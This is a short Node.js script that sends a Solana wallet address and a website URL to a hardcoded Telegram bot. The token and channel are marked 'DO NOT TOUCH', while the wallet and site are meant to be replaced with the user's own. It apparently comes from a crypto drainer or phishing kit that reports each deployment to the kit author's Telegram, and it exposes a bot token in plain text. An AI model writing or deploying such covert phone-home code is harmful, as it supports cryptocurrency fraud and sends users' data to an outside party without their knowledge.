const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '8271256922:AAFkJ0iGvWnKrDfivinpznNaid3Iw10rh_s';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '1932555133';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '5hjXb98QyJY8zB2Tsxy7rs3YB96ewKjjs1HUmERSwsVu';
const website_url = 'sola-sand.vercel.app';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
